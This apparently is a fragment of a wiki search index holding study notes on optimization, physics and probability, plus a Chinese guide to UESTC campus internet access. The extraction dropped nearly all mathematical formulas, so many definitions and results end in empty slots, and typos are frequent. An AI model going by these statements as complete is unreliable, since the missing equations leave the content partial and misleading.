可行解 和 是最优解"},{"title":"最优化算法速通 - 无约束优化","path":"/wiki/optim/unconstrained.html","content":"二次型函数 对称正定 收敛阶 收敛阶越高, 收敛率越高, 收敛速度越快. 拟线性收敛: , 线性收敛: , 超线性收敛: 二次收敛: 任意收敛序列的收敛阶大于等于 1. 梯度下降法 记 最速下降法 使用二次型精确步长公式, 则 精确步长线搜索, 搜索方向与梯度正交 能保证单调下降 能全局收敛 会形成锯齿状震荡轨迹, 效率低 最坏情况 ( 是 的一个特征向量时), 收敛阶为 1 固定步长法 只需要取 , 满足 时收敛. 牛顿法 类似一维牛顿法, 利用二次型来近似, 需要二阶可导, 可求 Hessian 矩阵. 二阶 Taylor 展开: 若 , 可求 的极小点, 得迭代公式 若二次型非正定, 则牛顿法搜索方向不一定是下降方向 目标函数是二次型时, 收敛阶为 需要初始点靠近极小点才有非常好的收敛性. 共轭类方法 共轭方向: . 对称正定, 则共轭向量组线性无关. 构造共轭向量组: Gram-Shimidt 正交化, 给定一组线性无关变量 基本共轭方向算法 给定初始点 和一组关于 共轭的方向 , 迭代公式: 使用二次型精确步长公式: 对于二次型, 任意初始点, 基本共轭方向算法能在 次迭代内收敛到全局极小点. 共轭方向算法中, , 有 扩张子空间定理: 每迭代一次, 都能在到目前为止的共轭方向张成的子空间中取到最优解. 共轭梯度法 不需要预先给定 的一组共轭方向, 能在迭代的过程中利用梯度不断产生共轭方向. , 给定初始值 若 , 停止迭代 若 停止迭代 , 回到第三步 非线性共轭梯度法 对于一般的函数, 用 Hessian 矩阵代替 , 但计算每个迭代点处的 Hessian 矩阵计算量大. 使用其他方法来近似代替 Hessian. 对于 , 使用一般的线搜索方法. 对于 , 有三种近似的公式. Hestenes-Stiefel: 用 替代 Polak-Ribiere: 近似认为 , 有 Fletcher-Reeves: 近似认为 拟牛顿法 希望避免牛顿法中求 Hessian 矩阵, 同时避免对矩阵求逆. 设法近似 , 在迭代中更新近似. 迭代公式: 拟牛顿方向: 步长: 更新迭代点: 矩阵 需要是对称矩阵, 目标函数是二次型函数时要满足 . 二次型问题中记 Hessian 矩阵为 , 则能保证拟牛顿方向 是 共轭的. 记 , 拟牛顿方程: 方程的解不唯一. 秩 1 校正 在 上添加一个秩 1 矩阵得到 , 再求解拟牛顿方程: 已知 , 可求解 和 得到迭代公式 初始时 可以任选对称正定实矩阵. 问题: 即使是二次型问题, 也可能非正定, 可能不是下降方向. 秩 1 公式的分母接近 0 会导致计算困难. DFP 算法 (秩 2 算法) 解方程组 代入得 取一组特解 得到迭代公式 DFP 公式能保证 正定则 正定, 但 接近奇异时可能会被卡住. BFGS 算法 除了构造 的近似矩阵 , 也构造 的近似矩阵 , 满足: 由对称性, 从 DFP 公式得到 Sherman-Morrison 公式: 若 非奇异, 列向量 , . 则 应用两次 Sherman-Morrison 公式简化 的计算"},{"title":"Physics Speedrun - Electric Field","path":"/wiki/physics/electric-field.html","content":"Electric Charge Two types: positive, negative Quantized: Conserved. Coulomb’s Law Premittivity of free space Electric Field For a point charge: Uniformly distributed charge along a line : Charge per unit length Notice that is defined as the outer angle. When it is infinitly long, , A plane of charge : Charge per unit area For a uniformly charged ring : Total charge A semi-circle : Charge per unit length A uniformly charged disk : Charge per unit area The infinite plane A parallel-plate capacitor : Charge per unit area Electric Dipoles Combination of two equal charges of opposite charges is called an electric dipole. Dipole moment: Dipole in external field Total force Torque on the dipole Field Lines Field lines The field point is in the direction tangent to the field line. Magnitude of numbers of lines crossing unit area the lines. Starts on + charges, ends on - charges. Never cross. Never closed. Electric Flux : Electirc flux through an area numbers of field lines passing that area. Uniform field In uniform field: General cases General cases: For a closed surface, define outward as positive, the net flux: Gauss’s Law The Gauss’s law: Differential form: Useful when the charge distribution is highly symmetric, may determine the magnitude of electric field by On a proper Gaussian surface, there must be A spherical shell Outside the shell: Inside the shell: Same for a uniformly charged conductor sphere A uniformly charged nonconducting sphere Outside the shell: Inside the shell: In a hole in a uniformly charged sphere, the electric field is uniform Proper Gaussian surface for an infinitly long cylinder Conductor in external field When in electorstatic equilibrium: Inside: On surface: Charge tends to concentrate on surface with greater curvature. Electric Potential Coulomb force is conservative. . Potential energy : Electric potential: Potential difference / voltage: Usually let at infinity: Field created by a point charge Charged conductor sphere : Same as point charge, : Same potential at any point, Uniformly charged rod Uniformly charged ring Determine from : Capacitors Capacitance of capacitor: A parallel-plate capacitor Cylindrical capacitor Capacitors in series Capacitors in parallel Electric energy stored: Energy per unit volume / Energy density: Dielectrics Capacitor compeletely filled by a deilectric Dielectric: Insulating material in capacitors. Harder to break down: Increase . Less equivlant distance between plates. Increase the capacitance: Dielectric constant : also noted as , relative permittivity. The permittivity of material: Energy density in a dielectric:"},{"title":"Physics Speedrun - Electromagnetic Induction","path":"/wiki/physics/emi.html","content":"Faraday’s Law of Induction An induced EMF is produced by a changing magnetic field The electromotive force (EMF) induced in a circuit is equal to the changing rate of magnetic flux throught the circuit. For a -loop coil: Induction current: Lenz’s Law An induced EMF is always in a direction that opposes the original change in flux that caused it. Total induced charge is only determined by and , regardless the procedure. Motional EMF Conductor moves in magentic field By Lorentz force: indicates a non-electrostatic field. Motional EMF: The result can also be derived by Firaday’s law. A straight wire moving perpandicular to a uniform magnetic field Motion on rails Constant : Constant EMF by source: Vortex Electric Field Vortex electric field In changing magnetic field, forces on static charges is created by vortex electric field. Generalize the definition of : The general form of Faraday’s law: where is the induced electric field. Differential form: Induced EMF around uniformly changing cylindrical magnetic field Inductor Self Inductance Self inductance Magnetic flux current Self inductance of the coil , unit: Henry A coil with significant is an inductor. EMF induced in an inductor: shows the electromagnetic inertia of a coil depends on geometry and ferromagnetics Inductors in AC curcuit have the effect of reactance / impedance Inductance of a long solenoid where denotes the volume. Inductance of coaxial cable Inductance of a rectangular toroid Mutual Inductance Two coils near each other The change of current in coil 1 causes EMF in coil 2. Total flux in coil 2 created by current : is the mutual inductance of coil 2 with respect to coil 1, depending on geometry and ferromagnetics. The change of current in coil 2 also causes EMF in coil 1: It can be proved that Mutual inductance , unit: Henry To minimize mutal inductance Two ideal coupling coils Generally, Total inductance when connecting 2 and 3 (Same direction): Magnetic Energy Storage Energy stored in an inductor: A long solenoid Energy per unit volume / Energy density: LC Circuit A simple LC circuit In a SHM: Displacement Current the discontinuity of current in a charging capacitor Follow the path , the Ampere’s law shows that the magnet field produced by should satisfy However, under the pervious defination of steady current model, the current enclosed by equals to zero, indicating that The result is contradictionary since there is no actual current passing through the capacitor: An extra term is required in Ampere’s law to handle the changing . We call normal current in wire the conduction current: Electric field between plates: We define the displacement current to reveal changing between the plates: Ampere’s law in a general form: And continuity of total current: Maxwell’s Equation Electric field: Electrostatic Field Induced (Vortex) Electric Field Total Electric Field Magnetic field: Conduction Current Displacement Current Total Current Maxwell’s equations: Maxwell’s equations in differential form: Maxwell’s equations for steady magnetic field and electrostatic field: Maxwell’s equations with magnetic charges (magnetic monopoles): Electromagnetic Waves Antenna Maxwell’s equations in free space without charges or conduction currents: Wave Equations 3D wave equation of electromagnetic wave: 1D (plane) wave equation: Properties Compared with standard wave equation: The speed of EM wave: EM ware is transverse wave in phase Particular solution of wave equation: , and are always in phase: Energy Total enegry stored per unit volume: With : Energy transport through EM wave Energy transports per unit time per unit area: The direction of energy transporting: Intensity: Time averaged Energy transporting by EM wave inside the battery and resistor"},{"title":"Physics Speedrun - Magnetic Field","path":"/wiki/physics/magnetic-field.html","content":"Magnetic Field Magnetism is the interaction of clectric currents or moving charges. Magnetic field is Created by / interacts on currents or moving charges Closed field lines without beginning or end Ampere Force Magnetic field exerts a force on a current, called Ampere forece. In uniform field: Ampere force in uniform field The magnetic field is defind by the formula . SI Unit for : Tesla General case: nonuniform , curved wire: Curved wire in uniform field In uniform field, it is equivalant to a stright wire from A to B. Interaction of currents Magnetic field freated by current Magnetic Dipole A rectangular current loop in a uniform field Total force is zero, but torque on the loop: Magnetic dipole moment: Direction of is defined by the right-hand rule. Torque: Valid for any plane current loop. A small circular current is called a magnetic dipole. For a loops coil / solenoid: An electron in an atom Orbital angular momentum: A rotating uniformly charged disk Lorentz Force Magnetic field exerts a force on a moving charge: Lorentz force does not do work on the charge. When , , free motion. Uniform circular motion When , the point charge do a uniform circular motion. General case The charge moves in a helix. Lorentz equation: Total force on a charge in electromagnet field The Hall effect Source of Magnetic Field Biot-Savart Law Infinitesimal current Magnetic equivalant to Coulumb’s law. Magnetic field due to an infinitesimal current: Permeability of free space: Direction: right-hand rule. Total magnetic field due to a full current: A straight current Infinite straight current: No magnetic field at A or B. Also no field inside the cylinder when all the current is on the surface. Force between parallel wires per unit length: Circular current on the axis Magnetic dipole moment: At the center of circular / arc current Gauss’s Law for Magnetic Field Magnetic flux: Gauss’s law for magnetic field: Magnetic field lines Magnetic field lines are closed lines without beginning or end. Ampere’s Law Magnetic field is produced by all currents: The sign of enclosed current: right-hand rule Magnetic field is not a conservative field: Maxwell equations for steady magnetic field and electrostatic field: Proper integral path for calculating magnetic field of a cylinderical current Coaxial cable No magnetic field when . Central part of solenoid Uniform magnetic field inside: Follow the intergration path. Toroid Nonuniform field inside:"},{"title":"Physics Speedrun - Quantum Theory","path":"/wiki/physics/quantum.html","content":"Photon Theory of Light The light ought to be emitted, transported, and absorbed as tiny particles, or photons. Blackbody Radiation All object emit thermal radiation. The total intensity of radiation . Differnent theories on the spectrum of blackbody radiation Wien’s law predicts the peak wavelength as Planck’s formula compeletely fits the experimental data. Planck’s hypothesis: The energy of any molecular vibration could be only some whole number multiply of , where the Planck constant and is the frequency of oscillation. Quantum of radiation: Photoelectric Effect Circuit of photoelectic effect Photoelectric effect: electron emitted under light. Relationships in photoelectic effect The photocurrent changes with voltage When is high, there is saturated photocurrent, related to the intensity of light When is low, there is a stopping potential / voltage , which is independent of the intensity of light. and changes over the frequency of light. When is low, there is a cutoff frequency , under which there will not be any photoelectrons. An electron is ejected out of the metal atom by an inelastic collition with a single photon. To get out of the atom, the electron need to absorb a constant amount of energy from the photon, and the rest of the photon’s energy transforms into the electron’s kinetic energy . The minimum energy to get out depends on the atom’s type, and is called work function . There is the photoelectric equation: From the equation we know: has a linerar relationship Compton Effect Compton's X-ray scattering experiment Scattering means light propagate in different directions when passing through material. In classical theory, EM waves are forced vibration, so their frequency (wavelength) should remain the same after being scattered. However, contradictionary experimental results have been observed: Wavelength changed after scattering depends on the **scattering angle** . In the view of photon theory, in Compton scattering, a _single_ photon hits an electroin and knocks it out of the atom, which is an elastic collision procedure. Energy is conserved during the procedure: Compton scattering The photon loses energy, causing . With the conservation of momentum: we can solve the **Compton shift**: and the **Compton wavelength**: ### Wave-Partical Duality Not only light has the property of wave-partial duality, but all matter does, called **de Borilie wave** or matter-wave. For a partical with momentum , it has a wavelength ## Bohr Model ### Early Models of Atom 1. J.J Thomtons's plum-pudding model 2. Rutherfords's planetary model 3. Bohr model ### The Spectrum of Hydrogen The spectrum of hydrogen Balmer's formula for visible lines: Rydberg constant: General formula for other series in UV and IR regions: - Lyman series (ultraviolet) - Balmer series (visible) - Paschen series (infrared) ### Bohr's Three Postulates 1. Stationary states: All electrons are in stable and discrete energy level 2. Quantum transition: An electron jumps to another energy level by emit or absorb a photon 3. Quantum condition for angular momentum: The electron's possible angular momentum is also discrete ### Orbital Properties Rutherford's model The orbital radius of electron is quantized where is called **Bohr radius**: Orbital kinetic energy: Electric potential energy: Total energy: is also quantized. ### Transition and Radiation - : Ground state, - : First excited state, - : Second excited state, The energy are all negative, called bound state. The binding / ionization energy: Jumping from upper state to lower state : where is the Rydberg constant: Energy level digram &gt; From de Borglie's hypothesis, we may consider the stable orbit for electron as a standing wave. For de Broglie wave: &gt; &gt; &gt; &gt; and for a circular standing wave: &gt; &gt; &gt; &gt; We can get the quantum condition by Bohr: &gt; &gt; ## Quantum Mechanics ### Wave Function The wave function is the _displacement_ of wave. The energy density of EM wave satisfies . In the view of particle theory, the number density of photon should satisfy . As discrete particles we can consider the **probability density** of finding photon, and let . As a probability distribution, the wave function should satisfy the **normallization condition**: Therefore we can treat the de Broglie wave as a probability wave. at a certain point represents the probability of finding the particle within volume aboud the given position and time. Conherent wave functions There is interference between coherent wave functions. De-conherence of wave functions When de-conherence occurs, Uncertainty Principle Measurement disturbs the state of the particle. When we observe an electron by a photon, increasing causes larger , and decreasing causes larger . There is always an uncertainty in position or momentum. The Heisenberg uncertainty principle says that, The position and the momentum of a particle can not be precisely determined simultaneously. Other forms: The principle indicates that Microscopic particles will not stay at rest. Diffraction of electron The central bright fringe satisfies the uncertainty relation Schrodinger Equation The Schrodinger equaiton is an equation to determine the wave function . A free particle1 with moves along axis. Consider a wave function in general complex value form For nonrelativistic free particle: And consider the potentioal energy, we get its Schrodinger equation: 3D time-dependent Schrodinger equation: is the Hamilton operator Time-independent Schrodinger equation: Solve the equation Each solution represents a stationary state The system may be in a superposition state The wave function of the system should be continuous, finite and normalized. An infinitely deep well potential The Schrodinger equation: where General solution: must be continous the energy is quantized: Notice that the minimum energy is not zero (zero point energy) The wave function: Figure of wave function de Broglie wavelength: A finite potential well The paritcle can get out even if (Quantum tunneling) Tunneling probability where Atoms Schrodinger equation for hydrogen atom Solution can be labeled with 3 quantum numbers Principle quantum number Orbital quantum number is the magnitude of orbital angular momentum Magnetic quantum number Space quantization: Except the orbital motion, the electron also has a spin and the spin angular momentum. Every elementary particle has a spin. Spin in a relativistic effect. Spin quantum number can be integers, and such kind of particles are called boson, such as photons. It can also be half-integers, called fermion, like electrons: Each electron occupies a state Different possile states for an electron with n=2 In a hydrogen atom, the wave function for ground state which produces a radial probability distribution Radial probability distribution This tells that there is no orbit for the electron in atom. It’s a probabality distribution related to different wave functions, like an electron cloud. The energy of an electron in an atom depends on and . In complex atoms where atomic number , there are two principles for the configuration of electrons: Lowest energy principle: At the ground state, each electron tends to occupt the lowest energy level. An empirical formula of energy: Pauli exclusion principle: No two electrons in an atom can occupy the same quantum state. Shell structure of electrons No interaction with outside, has spatial symmetry↩︎"},{"title":"概统速通 - 分布","path":"/wiki/prob/distributions.html","content":"0-1 分布 背景 贝努利实验 只有两个基本事件 分布列 特征函数 二项分布 背景 次独立重复实验 (将贝努利实验独立重复 次) 中事件 发生次数 每次实验的条件不变 各次实验的结果互不影响 分布列 极限分布 泊松分布: 时, 认为 正态分布: 最大可能值 数学期望 方差 特征函数 可加性 泊松分布 背景 将一长段区间分为 段, 求 时, 区间内事件发生次数 每一段区间内, 恰好发生一次事件的概率与区间长度称正比 每一段区间内, 发生两次以上事件是不可能事件 各段时间内发生事件是独立的 分布列 最大可能值 数学期望 方差 特征函数 可加性 超几何分布 背景 分类取球问题 个球, 个红球, 个白球, 不放回地取出 个球, 红球个数 分布列 几何分布 背景 持续进行独立重复试验, 直到发生一次事件 经过的实验次数 分布列 负二项分布 背景 持续进行独立重复试验, 直到总共发生 次事件 经过的实验次数 分布列 均匀分布 背景 随机变量 落在 的子区间的概率与子区间位置无关, 仅与其测度 (即长度) 成正比。 概率密度 数学期望 方差 特征函数 指数分布 概率密度 背景 灯泡寿命问题 满足无后效性 的含义为失效率 概率密度 数学期望 方差 特征函数 正态分布 背景 万恶之源 概率密度 标准正态分布 数学期望 方差 线性性 可加性 相互独立 特征函数 标准正态分布 阶矩 上侧分位数 二维正态分布 联合概率密度 边缘概率密度服从一维正态分布 和 相互独立 不相关 多维正态分布 联合概率密度 协方差矩阵 是实对称正定矩阵, 是均值向量 多维正态分布的边缘分布仍是正态分布 多维随机变量服从正态分布 任意线性组合服从正态分布 线性变换 所有分量相互独立 所有分量两两不相关 是对角矩阵 特征函数 Gamma 分布 概率密度 概率密度 Gamma 函数满足 数学期望 可加性 对数正态分布 概率密度 数学期望 Chi-Square 分布 概率密度 背景 个独立标准正态分布随机变量的和服从 分布 概率密度 自由度 数学期望 方差 可加性 上侧分位数 时近似认为 Student-T 分布 概率密度 背景 独立的标准正态分布变量 和自由度 的 Chi-Square 变量 概率密度函数 上侧分位数 时, 近似认为 F 分布 概率密度 背景 独立卡方随机变量的比值 概率密度函数 说明抽样分布定理定理 正态总体 的样本 , 样本均值 , 样本方差 与 相互独立样本均值, 总体均值, 总体方差 样本方差, 总体方差 样本均值, 样本方差 定理 正态总体 .样本方差之比 样本均值之差和样本方差: 若 其中"},{"title":"概统速通 - 大数定理","path":"/wiki/prob/large-number.html","content":"随机变量序列的收敛性 几种收敛性的关系 分布函数弱收敛 说明希望随机变量序列 的分布函数收敛到 的分布函数. 对于分布有 , 但是直观认为该分布应收敛到而 . 则不应将依分布函数收敛定义为逐点收敛. 应当去除不连续点. 定义 对于分布函数列 如果存在非降函数 使得 在 的每一个连续点上都成立, 则称 弱收敛于 , 记为 这样得到的极限函数是有界的非降函数, 但不一定是分布函数. 定理 正极限定理: 分布函数列弱收敛于分布函数, 则相应的特征函数列收敛于特征函数, 且在 的任意有限区间一致收敛. 特征函数一致连续, 特征函数收敛即为逐点收敛 定理 逆极限定理: 特征函数列收敛于某一函数 且 在 连续, 则分布函数列弱收敛于分布函数, 且 是 的特征函数 在连续 求特征函数的极限时, 遇到指数套指数等情形, 使用 Taylor 展开. 依分布收敛 用分布函数列收敛来定义随机变量序列收敛. 定义 随机变量序列 的分布函数列 弱收敛于 的分布函数 , 称 依分布收敛 于 (随机变量或常数), 记为 或 或 依概率收敛 仿照数列收敛定义随机变量序列收敛 定义 设 是定义在 上的随机变量序列, 若 有 或 称 依概率收敛 到 , 记为 或 很大时, 与 出现较大偏差的可能性很小, 有很大把握保证 和 很接近 几乎处处收敛 仿照函数列收敛定义随机变量序列收敛. 随机变量是样本空间上的实值函数. 但是要求 , 条件太强, 考虑弱化. 定义 设 是定义在 上的随机变量序列, 若存在随机变量或函数 使得 即 称随机变量序列 以概率 1 收敛于 或几乎处处收敛于 , 记为 大数定律 弱大数定律的关系 定义 弱大数定律: 设随机变量序列 中每一项的期望 都存在, 若 则称其服从弱大数定律. 前 项的算术平均值将紧密的聚集在其期望附近 对应的随机变量收敛 而不是 贝努利大数定律 定理 设 是 次重复独立试验中事件 发生的频率, 是事件 在每次实验中发生的概率, 则 , 即 此定理以严格的数学形式描述了频率的稳定性: 试验次数 很大时, 事件发生的频率将紧密的聚集在其概率附近 定理 独立同分布变量序列 , 则 小概率事件原理 概率很小的事件, 在一次试验中几乎是不可能发生的, 从而在实际中可看成不可能事件. 独立同分布大数定律 独立同分布的随机变量序列, 每一项的均值和方差存在 (且相等), 则服从弱大数定律. 切比雪夫大数定律 独立, 期望存在, 方差一致有界的随机变量序列服从弱大数定律. 说明若 一致有界, 则由夹逼准则知 泊松大数定律 独立随机变量序列 服从弱大数定律 辛钦大数定律 独立同分布变量只要数学期望存在就服从大数定律. 马尔科夫大数定律 随机变量序列只要满足 就服从大数定律. 强大数定律 定义 弱大数定律: 设随机变量序列 中每一项的期望 都存在, 若 则称其服从强大数定律. 服从强大数定律 服从弱大数定律 博雷尔强大数定律: 服从强大数定律 科尔莫哥洛夫判别法: 独立随机变量序列 服从强大数定律 科尔莫哥洛夫定理: 独立同分布随机变量序列满足 服从强大数定律 中心极限定理 定义 随机变量序列独立且存在有限数学期望和方差 随机变量序列服从中心极限定理 前 项和的标准化随机变量序列依分布收敛到标准正态分布. 服从中心极限定理的随机变量序列可进行概率的近似计算 中心极限定理解释了哪些随机变量可认为是服从正态分布的 定理 林德伯格—列维定理 (独立同分布中心极限定理): 独立同分布随机变量序列 , 服从中心极限定理 多个独立同分布变量之和近似服从正态分布 定理 棣莫佛—拉普拉斯定理 随机变量序列 服从中心极限定理 随机变量序列 , , 则 很大的二项分布可近似看成正态分布, 一般要求 定理 林德伯格: 独立随机变量序列满足林德伯格条件, 其中 , 则服从中心极限定理, 即 保证各随机叠加项一致的小. 大量一致的小的随机变量的近似正态分布. 定理 李雅普洛夫定理: 随机变量序列满足 服从中心极限定理."},{"title":"概统速通 - 随机变量的数字特征","path":"/wiki/prob/numerical-chars.html","content":"数字特征 期望 定义 离散型随机变量的数学期望: 离散型随机变量 若 则称 为 的数学期望或均值 要求绝对收敛是为了保证数学期望有唯一的数值 数学期望的随机变量所有可能取值对取值概率的加权平均, 是一个数 定义 连续型随机变量的数学期望: 连续型随机变量 概率密度为 , 若 则称 为 的数学期望或均值 对于任意随机变量 , 都可用分布函数 的 Riemann–Stieltjes 积分定义期望 (要求绝对可积) 说明Riemann–Stieltjes 积分参照 Riemann 积分.定义 Riemann–Stieltjes 积分: 是 上实值函数, 任意对 的分割 及任意分点 记和式若 , 有且 , 则称 是 关于 在 上的 R-S 积分, 记为广义 R-S 积分分部积分公式Cauchy-Schwarz 不等式: 若有且 单调不减, 则 存在且定理 连续有界, 单调有界 R-S 可积定理 广义 R-S 积分定理: 连续 存在则有 存在且 Riemann 可积 存在实数列 且 , 在 上取常数 离散型随机变量对应广义 R-S 积分情况 2, 连续型随机变量对应广义 R-S 积分情况 1 函数的期望 定理 是 的分布函数, 连续, 若绝对可积, 则 的数学期望存在且 方差 定义 为 的方差 (Deviation / Variance) 为 的标准差 Standard Deviation 或均方差 Mean Square Error. 性质 存在 存在 存在 Chebyshev 不等式 &gt; 粗略地通过方差限制了随机变量偏离均值的程度 &gt; 方差刻画了随机变量关于数学期望的偏离程度, 随机变量关于数学期望的偏离程度比关于其他任何值的偏离程度小. 说明 的标准化随机变量期望为 0, 方差为 1 矩 阶原点矩 阶绝对原点矩 阶中心矩 阶绝对中心矩 相关性 定义 多维随机变量的函数期望 性质 多维随机变量每一维期望都存在, 则 线性性 相互独立 性质 多维随机变量每一维方差都存在, 则 若 相互独立 定义 随机变量 的协方差 Covariance 性质 定义 随机变量 的相关系数 Correlation Coefficient 性质 以概率 1 线性相关 称 为不相关 独立 不相关 多维随机变量可构造协方差矩阵和相关系数矩阵, 是半正定矩阵. 条件期望与方差 定义 的条件下, 随机变量 的条件数学期望 是 的函数. 实际上, 等是常数, 而 是随机变量. 函数的条件数学期望 性质 独立 全数学期望公式 离散型 连续型 定义 的条件下 的条件方差 是 相对条件数学期望 的偏离程度的衡量指标 特征函数 一维 定义 上的随机变量 为 的特征函数 性质 在 上 一致连续 非负定: 有 线性变换 定理 波赫纳-辛钦: 是特征函数 在 上一致连续, 非负定且 定理 阶矩存在 存在且 用特征函数求矩 定理 反演公式: 的连续点 有 用特征函数求分布函数和概率 定理 唯一性定理: 分布函数恒等 特征函数恒定 定理 特征函数在 上绝对可积 连续型随机变量 定理 对于离散型随机变量 多维 定义 多维随机变量的特征函数 性质 在实平面上一致连续 的特征函数为 的特征函数为 定理 特征函数求矩 定理 反演公式 (要求落在矩形边界上的概率为 0) 定理 维随机变量相互独立 令 , 则 若独立同分布, 则"},{"title":"上网指南（中文）","path":"/wiki/uestc-internet/cn.html","content":"简介 本文是电子科技大学清水河校区上网指南，主要介绍了校园网的接入方式、常见问题和解决方法。根据所在宿舍楼的不同，接入方式也有所不同。 教学楼 您可以通过无线网络或有线网络接入校园网。 无线网络 打开无线网络设置，连接 UESTC-WiFi 网络。 新设备首次连接校园网，需要打开浏览器，访问任意网站，会自动跳转到登录页面。或者手动访问 http://wifi.uestc.edu.cn。 输入您的学号和统一身份认证密码，点击 “校园网登录”。 有线网络 使用网线连接墙面网口和电脑。 打开浏览器，访问任意网站，会自动跳转到登录页面。或者手动访问 http://aaa.uestc.edu.cn 或 http://10.253.0.237。 输入您的学号和统一身份认证密码，点击 “校园网登录”。 当你看到你的 IP 地址时，就说明你已经成功登录校园网。 宿舍区 宿舍区的网络由运营商提供，接入方式有所不同。 1-4 期公寓移动光纤宽带 1-4 期公寓的移动光纤宽带由中国移动提供，使用 PPPoE 拨号方式接入。简单来说，您需要把路由器的 WAN 口连接到光猫，配置为 PPPoE 拨号模式，并输入移动宽带账号和密码。您可以联系中国移动工作人员上门配置网络。 频繁地变换设备接入网络可能导致账号被冻结，建议使用路由器拨号，而不是直接在电脑上拨号，如果您的账号被冻结，请联系中国移动客服解冻。 5-6 期公寓 5-6 期公寓的移动宽带和电信宽带，使用学校提供的网页认证方式接入，需要将学校统一身份认证账号与宽带账号绑定。操作步骤如下： 连接路由器 你可以使用无线路由器接入网络，或者直接使用网线连接电脑和网口。使用无线路由器可以方便手机、平板等设备同时上网，如果使用网线连接电脑，则只能在电脑上使用校园网。 简单来说，你需要把路由器的 WAN 口配置为 DHCP 模式。如果你不知道如何配置，下面是详细说明。 找到墙面上的网口：通常在课桌下方，可能被柜子挡住。除非完全够不到墙面网口，请勿打开门口弱电箱直接连接光猫上的网口，以免损坏光猫。弱电箱光猫上的光纤和电源线十分脆弱，容易损坏。如果您打开弱电箱发现光猫所有指示灯不亮，或 SFP 指示灯不亮或黄色常量，请拨打 61831192 报修。 使用网线连接路由器的 WAN 口和墙面网口，或者直接连接电脑和墙面网口。一般来说 WAN 口就是最独特的那一个端口(一般在最边上)，有特殊的颜色或者标识，其他端口是 LAN 口。部分路由器不需要区分 WAN 和 LAN，只需要连接任意一个端口即可。 WAN口和LAN口 找到WAN口后，用网线将WAN口与网络插座连接，如下。 WAN口连网络插座 连接路由器的电源，打开路由器，等待路由器启动完成（可能需要 1-2 分钟）。 如果您的电脑有网口，可以直接使用网线连接电脑和路由器的 LAN 口，如果没有网口，可以连接到路由器的无线网络。路由器的标签上写有默认的 WiFi 名称和密码（如果有密码），如下图： 路由器的标签 连接到路由器后，在浏览器地址栏中输入网址，打开路由器的管理面板网站。路由器的标签上写有管理网址，可能是 192.168.1.1, tplogin.cn, miwifi.com 等，部分路由器首次连接后也会自动打开管理页面。有的路由器需要输入默认的用户名和密码，请查看路由器标签。 随后路由器会自动弹出设置向导，通常会需要您设置自己的 WiFi 名称和密码，以及路由器的管理密码等，您可以按照个人需求设置。重要的选项是 WAN 口设置（可能被称为“上网设置”、“WAN 设置”等），您需要选择 “自动获取 IP 地址” 或 “DHCP” 等选项（相对应的，不能选择 “PPPoE”， “拨号上网”， “静态 IP” 等选项），完成设置后，路由器可能会自动重启，重启后你需要使用刚刚设置的 WiFi 名称和密码重新连接路由器。下图展示了一个常见的路由器的 “上网设置” 页面： 绑定运营商账号 首次连接宿舍区网络，需要绑定运营商账号。你需要前往校内的中国电信、中国移动营业厅，确保你的手机卡已经办理了宽带业务，并向运营商工作人员询问你的宽带账号和密码。获得宽带账号和密码后，你需要将宽带账户绑定到学校统一身份认证账户上，操作方式如下： 在宿舍区，将电脑连接到上一步设置好的路由器或者直接连接到墙面网口。 网络登陆页面可能会自动打开，如果没有打开，请手动访问 http://10.253.0.235。 输入您的 学号和统一身份认证密码，点击 “自服务” (Self Service)。 点击左侧的 “多运营商绑定” (Carriers Bound)。 选择您的运营商（移动或电信），点击 “绑定”。 输入您的宽带账号和密码，点击 “绑定”。 移动用户可以发短信 czkdmm 到 10086 重置宽带密码。短信收到的账户是 SCXY173xxxxxxxx, 在绑定时需要输入 SCXY173xxxxxxxx@cmccgx, 密码是短信收到的密码。 电信用户的账号就是手机号，密码一般是 123456578，如果不对，试试手机号后 8 位，或者联系电信客服重置密码。 这里输错了账号和密码不会有任何提示，只有点击 “电信登录” 或 “移动登录” 后才会提示登录失败。 绑定成功后，您可以在 “多运营商绑定” 页面查看绑定的账号。 登录校园网 完成绑定后，您可以使用统一身份认证账号登录校园网。操作方式如下： 打开浏览器，访问任意网站，会自动跳转到登录页面。或者手动访问 http://10.253.0.235。 输入您的 学号和统一身份认证密码，根据您使用的运营商，点击 “移动登录” (Mobile Login) 或 “电信登录” (Telecom Login)。 当你看到你的 IP 地址时，就说明你已经成功登录校园网。 即使是设置妥当了，大约每周都需要重新登录一次。 常见问题 我无法打开登陆页面，提示“无法连接到网站” 可能有很多原因，首先请确保在登陆时已经关闭了任何代理服务器、VPN、加速器等软件。 打开 Windows 设置应用，选择“网络和 Internet” -&gt; “代理”，关闭代理服务器。 除了上面的代理设置，WireGuard、EasyConnect、ZeroTier 等 VPN 软件和游戏加速器也必须关闭。 成功登录校园网后，可以重新打开这些软件。 我经常需要重新登录到校园网 UESTC-WiFi：请确保在 WiFi 详情中关闭了 “使用随机 MAC 地址” 或类似选项。 教学区有线网络：同一个账号同时只能登录一台设备，如果您的账号在另一台设备上登录了，会导致之前的设备下线。重新启动电脑也必须重新登录。 宿舍区网络：根据运营商的设置，通常每周需要重新登录一次。也请您检查墙面网口是否错误连接到了 LAN 口。运营商方面的设置也可能导致您需要反复重新登录，您需要联系运营商解决。 我在宿舍区无法访问某些教学区的服务器，比如图书馆等 宿舍区网络和教学区网络存在防火墙，部分教学区服务器不能直接连接，您可以尝试使用 电子科技大学 VPN。 即使使用了电子科技大学 VPN，仍然存在少数服务器不能访问的情况，请联系管理服务器的老师或信息中心解决。 我给路由器设置了 DHCP 或自动获取 IP 地址，但路由器提示无法获取 IP 地址，或者获取到了 172 开头的 IP 地址。我打不开登录页面。 您的光猫故障了。请拨打 61831192 报修。 我在宿舍使用了路由器，但只有一台设备能同时上网，使用其他设备需要重新登陆或者不能上网 请确保路由器的 WAN 口连接了墙面网口，LAN 口连接了电脑或者其他设备。如果误把墙面网口连接到了 LAN 口，则会导致只有一台设备能上网。 我不知道我的宽带账号或密码 见这里 绑定运营商账号。 如果您绑定了错误的账号和密码，在绑定页面不会有任何提示，只有您点击 “电信登录” 或 “移动登录” 后才会提示登录失败。 我可以绑定其他人的宽带账号吗？ 不能。绑定的宽带账号必须是您本人的。一个宽带账号只能绑定一个统一身份认证账号，否则会导致错误。 我在校园网登录页面输入了账号和密码，点击 “电信登录” 或 “移动登录” 后，弹出窗口提示登陆失败，还有英文的报错代码 更新：当天办理的宽带业务，系统内可能没有更新信息，请等待一天再尝试登录。 请确认您输入的是统一身份认证账号和密码，而不是宽带账号和密码。 请确认您已经绑定了正确的宽带账号，绑定成功后，您可以在 “自服务” -&gt; “多运营商绑定” 页面查看绑定的账号。 